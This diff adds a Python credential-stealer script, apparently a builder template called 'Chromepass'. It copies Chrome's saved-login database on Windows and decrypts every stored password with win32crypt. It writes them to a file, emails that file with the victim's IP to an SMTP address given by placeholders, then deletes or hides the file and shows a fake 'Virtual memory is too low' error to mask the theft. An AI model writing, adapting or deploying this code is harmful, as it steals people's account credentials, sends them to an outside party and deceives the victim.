@@ -1,0 +1,118 @@
+import ctypes
+import smtplib
+import os
+import win32crypt
+import urllib
+import socket
+import queue
+from shutil import copyfile
+from subprocess import check_call
+from sqlite3 import connect
+from requests import get, post
+from email.utils import formatdate
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+
+destination = "error.txt"
+
+
+def getpass():
+
+	path = os.getenv("LOCALAPPDATA") + \
+		"\\Google\\Chrome\\User Data\\Default\\Login Data"
+
+	path2 = os.getenv("LOCALAPPDATA") + \
+		"\\Google\\Chrome\\User Data\\Default\\Login2"
+
+	ASCII_TRANS = '_' * 32 + ''.join([chr(x)
+									  for x in range(32, 126)]) + '_' * 130
+	path = path.strip()
+	path = urllib.parse.unquote(path)
+	if path.translate(ASCII_TRANS) != path:	 # Contains non-ascii
+		path = path.decode('latin-1')
+	path = urllib.request.url2pathname(path)
+
+	ASCII_TRANS = '_' * 32 + ''.join([chr(x)
+									  for x in range(32, 126)]) + '_' * 130
+	path2 = path2.strip()
+	path2 = urllib.parse.unquote(path2)
+	if path2.translate(ASCII_TRANS) != path2:  # Contains non-ascii
+		path2 = path2.decode('latin-1')
+	path2 = urllib.request.url2pathname(path2)
+	try:
+		copyfile(path, path2)
+	except:
+		pass
+
+	conn = connect(path2)
+
+	cursor = conn.cursor()
+
+	cursor.execute(
+		'SELECT action_url, username_value, password_value FROM logins')
+
+	if os.path.exists(destination):
+		os.remove(destination)
+
+	sites = []
+	for raw in cursor.fetchall():
+		try:
+			if raw[0] not in sites:
+				if os.path.exists(destination):
+					with open(destination, "a") as password:
+						password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
+									   '\n' + "Password: " +
+									   win32crypt.CryptUnprotectData(raw[2])[1].decode("utf-8") + '\n')
+				else:
+					with open(destination, "w") as password:
+						password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
+									   '\n' + "Password: " +
+									   win32crypt.CryptUnprotectData(raw[2])[1].decode("utf-8") + '\n')
+				sites.append(raw[0])
+		except:
+			continue
+
+	conn.close()
+	return 0
+
+
+def sendpass():
+	host_ip = socket.gethostbyname(socket.gethostname())
+	mailto="<<MAILTO>>"
+	email = "<<EMAIL>>"
+	pwd = "<<PASSWORD>>"
+	server = "<<SERVER>>"
+	msg = MIMEMultipart()
+	filename = destination
+	f = open(filename)
+	attachment = MIMEText(f.read())
+	f.close()
+	attachment.add_header('Content-Disposition',
+						  'attachment', filename=destination)
+	msg['Subject'] = f'{host_ip}'
+	msg['From'] = "Chromepass <chromepass@itsec.bz>"
+	msg['To'] = mailto
+	msg["Date"] = formatdate(localtime=True)
+	msg.attach(attachment)
+	mailer = smtplib.SMTP(server, 587)
+	mailer.starttls()
+	mailer.login(email, pwd)
+	mailer.sendmail(email, mailto, msg.as_string())
+	mailer.close()
+
+
+getpass()
+sendpass()
+
+try:
+	os.remove(destination)
+except:
+	check_call(["attrib", "+H", destination])
+	
+MB_OK = 0x00
+MB_ICONSTOP = 0x10
+ctypes.windll.user32.MessageBoxW(
+	None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
+
+
